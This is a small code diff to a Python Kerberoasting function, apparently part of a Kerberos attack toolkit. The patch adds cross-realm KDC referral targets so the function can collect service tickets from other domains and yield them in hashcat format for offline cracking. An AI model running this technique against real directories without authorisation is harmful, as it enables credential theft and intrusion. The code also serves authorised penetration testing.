@@ -66,6 +66,13 @@ async def kerberoast(factory:KerberosClientFactory, usernames:List[str], domain:
 	if not isinstance(override_etype, list):
 		override_etype = [override_etype]
 	
+	# cross_domain: True, or the KDC target(s) of the other realm(s) to use
+	# instead of resolving the realm names (see get_referral_ticket)
+	referral_kdcs = None
+	if cross_domain is not True and cross_domain is not False and cross_domain is not None:
+		referral_kdcs = cross_domain
+		cross_domain = True
+
 	for username in usernames:
 		try:
 			kcomm = factory.get_client()
@@ -74,7 +81,7 @@ async def kerberoast(factory:KerberosClientFactory, usernames:List[str], domain:
 			kcommnew = kcomm
 			if cross_domain is True:
 				#print('Getting referral ticket for %s' % spn.domain)
-				_, _, _, new_factory = await kcomm.get_referral_ticket(spn.domain)
+				_, _, _, new_factory = await kcomm.get_referral_ticket(spn.domain, referral_kdcs)
 				kcommnew = new_factory.get_client()
 			tgs, _, _ = await kcommnew.get_TGS(spn, override_etype = override_etype)
 			yield username, TGSTicket2hashcat(tgs), None
